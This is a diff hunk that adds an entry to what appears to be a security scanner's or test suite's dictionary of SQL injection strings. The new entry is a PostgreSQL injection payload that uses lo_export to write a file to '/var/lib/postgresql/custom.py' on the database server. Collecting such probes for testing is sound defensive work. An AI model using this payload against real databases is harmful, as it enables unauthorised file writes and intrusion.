@@ -230,6 +230,8 @@ Sql_field_injects = overrides.get(
             "character-casting": "chr(97)",
             "system-catalog": "from pg_catalog",
             "always-true": "or 1=1",
+            "lo_prefix_tables": "admin_logins RIGHT JOIN (SELECT lo_export('123456', '/var/lib/postgresql/custom.py') AS dummy_column) AS dummy ON 1 = 1 ",
+
         },
         "parameters": {
             "ReportEntry":{
